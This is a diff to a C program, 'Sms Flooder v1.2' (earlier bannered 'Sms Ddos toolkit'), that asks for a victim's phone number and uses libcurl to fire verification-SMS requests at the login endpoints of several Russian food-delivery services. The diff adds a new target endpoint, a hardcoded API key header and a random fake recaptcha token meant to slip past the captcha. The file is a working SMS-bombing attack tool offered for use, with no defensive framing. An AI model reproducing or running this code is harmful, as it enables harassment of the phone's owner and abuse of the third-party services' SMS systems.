@@ -1,17 +1,28 @@
-/*  Sms Flooder v1.1
- *  gcc sms-flooder_v1.1.c -lcurl
- *  ./smsFlooder1.1
+/*  Sms Flooder v1.2
+ *  gcc sms-flooder.c -lcurl
+ *  ./sms-flooder
 */
 
 #include <stdio.h>
 #include <curl/curl.h>
+#include <stdlib.h>
+
+/* Get randon int */
+int GetRandInt (int min, int max){
+    
+    int r;
+    srand(time(NULL));
+    r = rand();
+    if (r < 0) r*=-1;
+    r%=max+min;
+    return r;
+}
 
 /* Delivery-club Get Cookie + Sms Flood func*/
 void SmsDelevery(char* phone) {
     CURL *curl;
     CURLcode res;
     char Buf[512];
-
 
     curl = curl_easy_init();
     if(curl) {
@@ -63,7 +74,7 @@ void SmsDelevery(char* phone) {
 }
 
 /* Dostaevsky-food Get cookie func */
-void GetCookieDostaevsky(char* phone) {
+void GetCookieDostaevsky() {
     CURL *curl;
     CURLcode res;
 
@@ -87,12 +98,11 @@ void GetCookieDostaevsky(char* phone) {
     curl_global_cleanup();
 }
 
-
 /* Dostaevsky-food Sms Flood func*/
-void smsDostaevsky(char* phone) {
+void SmsDostaevsky(char* phone) {
     CURL *curl;
     CURLcode res;
-    char Buf[512]; // Buffer for Post data
+    char Buf[512];
     char token[128];
     int f=0;
 
@@ -136,10 +146,10 @@ void smsDostaevsky(char* phone) {
 }
 
 /* Ollis Sms Flood func*/
-void smsOllis(char* phone) {
+void SmsOllis(char* phone) {
     CURL *curl;
     CURLcode res;
-    char Buf[512]; // Buffer for Post data
+    char Buf[512];
 
     curl = curl_easy_init();
     if(curl) {
@@ -152,9 +162,42 @@ void smsOllis(char* phone) {
         chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
         chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
 
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
 
         sprintf(Buf, "{\"query\":\"mutation { phone(number:\\\"%s\\\", locale:ru) { token error { code message } } }\"}", phone);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
+/* M-food sms funk*/
+void SmsMfood(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[512];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        /* Post reqquest */
+        curl_easy_setopt(curl, CURLOPT_URL, "https://api.crm.p-group.ru/checkout/login");
+        chunk = curl_slist_append(chunk, "Host: api.crm.p-group.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
+        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");
+        // What is x-keypass?
+        chunk = curl_slist_append(chunk, "x-keypass: lebfgiuDaeEYiou2%3255$208@{wdw{]}");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        // How to work recaptchaToken?
+        sprintf(Buf, "{\"departmentId\":3,\"regionId\":2,\"phone\":\"%s\",\"recaptchaToken\":\"%d\"}", phone, GetRandInt(500, 10000));
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
 
         res = curl_easy_perform(curl);
@@ -170,14 +213,24 @@ void smsOllis(char* phone) {
 int main(void)
 {
     char phone[16];
-    printf("\n\t------------------------\n\t|  Sms Ddos toolkit    |\n\t|----------------------|\n\t| Developed by MrTavas |\n\t------------------------\n");
+
+    // Print Banner
+    printf("\n\t------------------------\n\t|  Sms Flooder v1.2    |\n\t|----------------------|\n");
+    printf("\t| Developed by MrTavas |\n\t------------------------\n");
+    printf("\n[?] Number format: 71231231212\n");
     printf("\n[*] Started...\n[?] Phone to attck -> ");
     scanf("%s", phone);
-
+    
+    /* Get cookies */
+    GetCookieDostaevsky();
+    
+    /* Flood */
     SmsDelevery(phone);
-    GetCookieDostaevsky(phone);
-    smsDostaevsky(phone);
-    smsOllis(phone); // Ollis don't have cookie and capcha lol
+    SmsDostaevsky(phone);
+    SmsOllis(phone);
+    SmsMfood(phone);
 
     return 0;
 }
+
+
